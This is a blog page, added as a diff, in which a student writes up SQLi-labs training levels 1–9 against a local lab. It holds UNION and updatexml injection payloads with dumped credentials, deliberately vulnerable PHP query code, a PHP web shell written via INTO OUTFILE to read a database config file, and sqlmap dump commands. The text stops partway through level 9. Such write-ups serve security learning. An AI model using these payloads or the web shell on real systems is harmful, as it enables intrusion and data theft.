@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>白白毛毛</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/_custom.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="bg-post">
+
+<div class="sidebar">
+    <div class="header-info">
+        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
+        <div class="site-author">白白毛毛</div>
+    </div>
+    <nav class="nav">
+        <a href="/">首页</a>
+        <a href="/categories">分类</a>
+        <a href="/archives">所有</a>
+    </nav>
+    <div class="contact-section">
+        <p>If you want find me:</p>
+        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
+        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
+        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
+    </div>
+</div>
+
+<div class="content-area">
+    
+<div style="height: 60px;"></div>
+<div class="content-wrapper">
+    <article class="post-article">
+        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">sql lab 实战</h1>
+        
+        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
+            <span>📅 发布: 2025-12-25</span>
+            <span style="margin: 0 15px;">|</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-30</span>
+            
+            
+             <span style="margin: 0 15px;">|</span>
+             📂 学习
+            
+        </div>
+        
+        <div class="article-content">
+            <h1 id="SQL-LAB-实战："><a href="#SQL-LAB-实战：" class="headerlink" title="#SQL LAB 实战："></a>#SQL LAB 实战：</h1><h2 id="1："><a href="#1：" class="headerlink" title="#1："></a>#1：</h2><p><img src="/images/QQ20251225-190908.png" alt="alt text"></p>
+<p>输入直接输入?id&#x3D;1。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+
+<p>输入?id&#x3D;2.</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Angelina</span><br><span class="line">Your Password:I-kill-you</span><br></pre></td></tr></table></figure>
+
+<p>目测是联合注入。</p>
+<p>开始判断字符还是数字注入。</p>
+<p>输入?id&#x3D;2-1</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Angelina</span><br><span class="line">Your Password:I-kill-you</span><br></pre></td></tr></table></figure>
+
+<p>与?id&#x3D;2一样，说明sql后端并非数字计算类，猜测字符型。</p>
+<p>输入?id&#x3D;1’。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>报错了，大概率是多加进去的单引号破坏了mysql语句。</p>
+<p>再加一个单引号，?id&#x3D;1’’。</p>
+<p>得到回显是正常没有报错的，目测后端是像这个的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>进行列表测试，发现?id&#x3D;1’ ORDER BY 3 –+这个是正常的，但?id&#x3D;1’ ORDER BY 4 –+就出问题了，说明一共是三个列表。</p>
+<p>进行显位测试，发现?id&#x3D;-1’ UNION SELECT 1, 2, 3 –+时，网页回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现，2是回显在name,3是回显在Password。</p>
+<p>进行爆库。</p>
+<p>注入?id&#x3D;-1’ UNION SELECT 1, database(), 3 –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现当前数据库名字为security。</p>
+<p>进行爆表测试。</p>
+<p>注入?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>到这里基本就已经彻底打入数据库，可以随时拿到我们需要的东西了。</p>
+<p>注入?id&#x3D;-1’ UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema &#x3D;’security’ AND table_name&#x3D;’users’ –+</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:id,username,password</span><br></pre></td></tr></table></figure>
+
+<p>users列中存放着id 用户名以及密码。</p>
+<p>注入?id&#x3D;-1’ UNION SELECT 1,group_concat(username SEPARATOR ‘-‘),group_concat(password SEPARATOR ‘-‘) FROM users –+</p>
+<p>得到内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb-Angelina-Dummy-secure-stupid-superman-batman-admin-admin1-admin2-admin3-dhakkan-admin4</span><br><span class="line">Your Password:Dumb-I-kill-you-p@ssword-crappy-stupidity-genious-mob!le-admin-admin1-admin2-admin3-dumbo-admin4</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>过程小总结：</p>
+<p>测试发现并非数字型，且加入单引号报错，推断后端mysql代码，然后进行正常攻击，完完全全的新手关。</p>
+<hr>
+<h2 id="2："><a href="#2：" class="headerlink" title="#2："></a>#2：</h2><p><img src="/images/QQ20251225-194450.png" alt="alt text"></p>
+<p>先正常的测试类型，注入?id&#x3D;1，有回显，猜测是联合与报错。</p>
+<p>注入?id&#x3D;3-1。</p>
+<p>发现回显内容跟注入?id&#x3D;2一样，很像数字型，但又发现注入?id&#x3D;1’，一样报错。</p>
+<p>猜测后端为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>注入?id&#x3D;-1 UNION SELECT 1, 2, 3。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现回显位。</p>
+<p>进行爆库测试，注入?id&#x3D;-1 UNION SELECT 1, database(), 3。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome  Dhakkan</span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现数据库名字，security。</p>
+<p>进行爆表，注入?id&#x3D;-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema &#x3D; ‘security’。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome  Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现表名，看看表数据。</p>
+<p>注入?id&#x3D;-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name &#x3D; ‘users’。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>ok，直接注入?id&#x3D;-1 UNION SELECT 1, group_concat(username, ‘~’, password), 3 FROM users。看看内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb~Dumb,Angelina~I-kill-you,Dummy~p@ssword,secure~crappy,stupid~stupidity,superman~genious,batman~mob!le,admin~admin,admin1~admin1,admin2~admin2,admin3~admin3,dhakkan~dumbo,admin4~admin4</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>换个注入方式看一下，注入?id&#x3D;-1 UNION SELECT 1,group_concat(username SEPARATOR ‘-‘),group_concat(password SEPARATOR ‘-‘) FROM users。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb-Angelina-Dummy-secure-stupid-superman-batman-admin-admin1-admin2-admin3-dhakkan-admin4</span><br><span class="line">Your Password:Dumb-I-kill-you-p@ssword-crappy-stupidity-genious-mob!le-admin-admin1-admin2-admin3-dumbo-admin4</span><br></pre></td></tr></table></figure>
+
+<p>所以后端应该就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这种的类型。</p>
+<hr>
+<h2 id="3："><a href="#3：" class="headerlink" title="#3："></a>#3：</h2><p><img src="/images/QQ20251226-183830.png" alt="alt text"></p>
+<p>通过基本的注入测试。</p>
+<p>?id&#x3D;1	?id&#x3D;2	?id&#x3D;2-1	?id&#x3D;1’。</p>
+<p>发现大概率为字符型sql。</p>
+<p>但直接注入?id&#x3D;1’ ORDER BY 3 –+。</p>
+<p>题目报错。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;ORDER BY 3 -- &#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>根据回显的报错信息可以看见。</p>
+<p>在 – 的后面多了一个’)，因此我们就可以猜测，也许题目的源码就是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = (&#x27;$id&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>试着注入?id&#x3D;1’) ORDER BY 3 –+。</p>
+<p>发现不报错了，测试一番后确定。</p>
+<p>列数为3。</p>
+<p>注入?id&#x3D;-1’) UNION SELECT 1, database(), 3 –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>确认库名，security。</p>
+<p>注入?id&#x3D;-1’) UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema &#x3D; ‘security’ –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>ok，其实后面的过程就跟正常的字符型注入一样了，只是之前是单引号，这次的后端限制我们是单引号加右括号了。</p>
+<p>最终注入?id&#x3D;-1’) UNION SELECT 1,group_concat(username SEPARATOR ‘-‘),group_concat(password SEPARATOR ‘-‘) FROM users –+。</p>
+<p>就能拿到重要信息了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb-Angelina-Dummy-secure-stupid-superman-batman-admin-admin1-admin2-admin3-dhakkan-admin4</span><br><span class="line">Your Password:Dumb-I-kill-you-p@ssword-crappy-stupidity-genious-mob!le-admin-admin1-admin2-admin3-dumbo-admin4</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="4："><a href="#4：" class="headerlink" title="#4："></a>#4：</h2><p><img src="/images/QQ20251227-182352.png" alt="alt text"></p>
+<p>​	其实看到第四关的描述，我感觉就是报错注入的类型。</p>
+<p>事不宜迟，试一试。</p>
+<p>注入?id&#x3D;2”。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;2&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>好吧，其实不是，我刚才试了好几次直接报错注入是不行的。</p>
+<p>而且不存在?id&#x3D;1 跟 ?id&#x3D;2-1 返回的内容相同，说明也不是数字型。</p>
+<p>再加上上面的?id&#x3D;2“ 报错，大概率为字符型，而且根据错误的信息来看，大致猜测源码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM news WHERE id = &quot;$id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>尝试注入?id&#x3D;1” ORDER BY 3 –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;ORDER BY 3 -- &quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>应该是括号问题。</p>
+<p>尝试注入?id&#x3D;1”) ORDER BY 3 –+。</p>
+<p>这次可以了，那就可以认为源码是类似这种的了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM news WHERE id = (&quot;$id&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>跟第三题一样，是引号加括号的类型。</p>
+<p>爆列一下，发现还是3列。</p>
+<p>爆一下，数据库，?id&#x3D;-1”) UNION SELECT 1, database(), 3 –+。</p>
+<p>发现还是security，感觉这个靶场估计所有的数据库名字都叫security把。</p>
+<p>爆一下表，注入?id&#x3D;-1”) UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema &#x3D; ‘security’ –+。</p>
+<p>依旧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>感觉内容应该都没什么区别，不过还是要做的。</p>
+<p>读一下表，注入?id&#x3D;-1”) UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name &#x3D; ‘users’ –+。</p>
+<p>成功，内容依旧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id，username，password</span><br></pre></td></tr></table></figure>
+
+<p>看看数据，注入?id&#x3D;-1”) UNION SELECT 1,group_concat(username SEPARATOR ‘-‘),group_concat(password SEPARATOR ‘-‘) FROM users –+。</p>
+<p>完美注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb-Angelina-Dummy-secure-stupid-superman-batman-admin-admin1-admin2-admin3-dhakkan-admin4</span><br><span class="line">Your Password:Dumb-I-kill-you-p@ssword-crappy-stupidity-genious-mob!le-admin-admin1-admin2-admin3-dumbo-admin4</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="5："><a href="#5：" class="headerlink" title="#5："></a>#5：</h2><p><img src="/images/QQ20251227-184739.png" alt="alt text"></p>
+<p>这一题就比较符合报错注入的情况了，应该不管怎么注入，怎么测试，所有的内容都返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in...........</span><br></pre></td></tr></table></figure>
+
+<p>似乎所有的正确注入都是这个返回，那试一试报错注入。</p>
+<p>注入?id&#x3D;-1 AND (updatexml(1, concat(0x7e, (select user()), 0x7e), 1))。</p>
+<p>没有任何回显，看起来就像是什么都没有发生，猜测是类似字符型注入加了一些奇怪的单引号，或者双引号。</p>
+<p>试一试加一个单引号，注入?id&#x3D;-1’ AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>猜测后端源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT username FROM users WHERE id = &#x27;$id&#x27;&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">    echo &quot;XPATH syntax error: &quot; . mysql_error();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后就是爆表和读表了。</p>
+<p>注入?id&#x3D;-1’ AND updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1), 0x7e), 1) –+。</p>
+<p>由于报错注入只能显示一行的内容，想要看其他的内容，只能多次注入。</p>
+<p>所以一番注入后，我们得到了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emails referers ugants users</span><br></pre></td></tr></table></figure>
+
+<p>总共四个表。</p>
+<p>随便拿一个表作为代表，读取一下，注入?id&#x3D;-1’ AND updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name&#x3D;’users’ limit 1,1), 0x7e), 1) –+。</p>
+<p>看见一个 username。</p>
+<p>读取一下username的数据，注入?id&#x3D;-1’ AND updatexml(1, concat(0x7e, (select username from users limit 0,1), 0x7e), 1) –+。</p>
+<p>之后只要一个一个更改0,1前面的0，就可以读取到所有信息了。</p>
+<hr>
+<h2 id="6："><a href="#6：" class="headerlink" title="#6："></a>#6：</h2><p><img src="/images/QQ20251227-214303.png" alt="alt text"></p>
+<p>简单的测试后，发现所有的正常注入都是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in...........</span><br></pre></td></tr></table></figure>
+
+<p>这样的回显，说明正常注入的回显是固定的，所有我们只能采用报错注入。</p>
+<p>经过几次测试后，发现这次的报错注入的id处应该是加了双引号，类似这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&quot;id&quot;];</span><br><span class="line">$sql = &quot;SELECT username FROM users WHERE id = &#x27;$id&#x27;&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">    echo &quot;XPATH syntax error: &quot; . mysql_error();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接注入id&#x3D;-1” AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>那看来就是一样的操作了。</p>
+<p>具体回显就不再贴出，仅展示对应作用的注入内容。</p>
+<p>?id&#x3D;-1” AND updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1), 0x7e), 1) (查表)</p>
+<p>?id&#x3D;-1” AND updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name&#x3D;’users’ limit 1,1), 0x7e), 1) –+ (查内容)</p>
+<p>?id&#x3D;-1” AND updatexml(1, concat(0x7e, (select username from users limit 0,1), 0x7e), 1) –+ (查数据)</p>
+<p>其实就是上一题的单引号改成双引号。</p>
+<hr>
+<h2 id="7："><a href="#7：" class="headerlink" title="#7："></a>#7：</h2><p><img src="/images/QQ20251229-150424.png" alt="alt text"></p>
+<p>不论是数学型注入，还是字符型注入，甚至报错注入。</p>
+<p>回显只有两种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure>
+
+<p>固定回显以及语句错误，稍微查了一下，发现这其实是一个文件注入。</p>
+<p>所以，目前的思路就是写入一个一句话木马，然后通过这个木马文件获取权限然后对数据库进行操作。</p>
+<p>注入 <code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @system($_GET[&quot;cmd&quot;]); ?&gt;&#39; into outfile &quot;/var/www/html/Less-7/shell.php&quot;--+</code></p>
+<p>其实在这个之前，我们要先进行列表的确定，以及文件相对文件相对位置的探索。</p>
+<p>通过多次注入，可以发现在注入?id&#x3D;1’))时，网页正好报错，可以猜测后端的源码是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&quot;id&quot;];</span><br><span class="line">$sql = &quot;SELECT username FROM users WHERE id = ((&#x27;$id&#x27;))&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>类似这种的，然后通过爆列，确定三列。</p>
+<p>注入文件后，我们就可以执行命令了。</p>
+<p>首先 <strong>php -s &#x2F;var&#x2F;www&#x2F;html&#x2F;sql-connections&#x2F;db-creds.inc</strong></p>
+<p>查看数据库配置，通过执行php命令返回上一级目录显示数据库配置文件。</p>
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 Dumb Dumb 1 2 &lt;?php</span><br><span class="line"></span><br><span class="line">//give your mysql connection username n password</span><br><span class="line">$dbuser =&#x27;root&#x27;;</span><br><span class="line">$dbpass =&#x27;&#x27;;</span><br><span class="line">$dbname =&quot;security&quot;;</span><br><span class="line">$host = &#x27;localhost&#x27;;</span><br><span class="line">$dbname1 = &quot;challenges&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>怎么说呢，我好像一不小心把靶场干穿了。</p>
+<p>算了先不管那么读，我们可以看见数据库的名字为security，然后用户名为root，密码为空。</p>
+<p>那我们直接登入数据库执行mysql语句，来查询数据。</p>
+<p><code>mysql -u root -e &quot;show tables from security;&quot;</code></p>
+<p>启动mysql，以用户root，密码空，登入，然后执行查表。</p>
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 Dumb Dumb 1 2 Tables_in_security emails referers uagents users</span><br></pre></td></tr></table></figure>
+
+<p>然后随便看一个表。</p>
+<p><code>mysql -u root -e &quot;select * from security.users;&quot;</code></p>
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 Dumb Dumb 1 2 id username password 1 Dumb Dumb 2 Angelina I-kill-you 3 Dummy p@ssword 4 secure crappy 5 stupid stupidity 6 superman genious 7 batman mob!le 8 admin admin 9 admin1 admin1 10 admin2 admin2 11 admin3 admin3 12 dhakkan dumbo 14 admin4 admin4</span><br></pre></td></tr></table></figure>
+
+<p>这题也算是解决啦。</p>
+<hr>
+<h2 id="8："><a href="#8：" class="headerlink" title="#8："></a>#8：</h2><p><img src="/images/QQ20251230-191155.png" alt="alt text"></p>
+<p>一开始就直接进行简单测试，发现就有?id&#x3D;1 ，存在一个简单的回显，其他都没有，在?id&#x3D;1上面做文章也没有结果，所以有点懵逼的我，想起来sqlmap这个工具，于是就使用了一下。</p>
+<p><code>sqlmap -u &quot;http://localhost/Less-8/?id=1&quot; --batch</code></p>
+<p><img src="/images/QQ20251229-212310.png" alt="alt text"></p>
+<p>随便扫一下，就出结果了，显示存在布尔盲注和时间盲注。</p>
+<p>对于时间盲注，我目前还没有使用过，所以先考虑的是布尔盲注，简单学习一下指令。</p>
+<p><code>sqlmap -u &quot;http://localhost/Less-8/?id=1&quot; --batch --current-db</code></p>
+<p><img src="/images/QQ20251229-213112.png" alt="alt text"></p>
+<p>回显就直接出来了security，这个数据库名。</p>
+<p>再通过数据库名，使用指令。</p>
+<p><code>sqlmap -u &quot;http://localhost/Less-8/?id=1&quot; --batch -D security --tables</code></p>
+<p><img src="/images/QQ20251229-213313.png" alt="alt text"></p>
+<p>这边也是同样直接直接爆了出来。</p>
+<p>有了表名，再探探数据。</p>
+<p><code>sqlmap -u &quot;http://localhost/Less-8/?id=1&quot; --batch -D security -T users --dump</code></p>
+<p><img src="/images/QQ20251229-213849.png" alt="alt text"></p>
+<p>看这边，也是一下子就出来了。</p>
+<p>sqlmap确实很好用，很轻松的就解决了，估计以后sqlmap就不能直接一把梭了。</p>
+<hr>
+<h2 id="9："><a href="#9：" class="headerlink" title="#9："></a>#9：</h2><p><img src="/images/QQ20251230-203834.png" alt="alt text"></p>
+<p>怎么说呢，在打开题目的时候，我瞄到了，第九关有个time，时间盲注吧。</p>
+<p>直接sqlmap扫，也是符合我的记忆。</p>
+<p><img src="/images/QQ20251230-204022.png" alt="alt text"></p>
+<p>直接提示存在布尔盲注和时间盲注。</p>
+<p>同样直接sqlmap，<code>sqlmap -u &quot;http://localhost/Less-9/?id=1&quot; --batch --current-db</code></p>
+<p><img src="/images/QQ20251230-204345.png" alt="alt text"></p>
+<p>security，又是你。</p>
+<p><code>sqlmap -u &quot;http://localhost/Less-9/?id=1&quot; --batch -D &quot;security&quot; --tables</code></p>
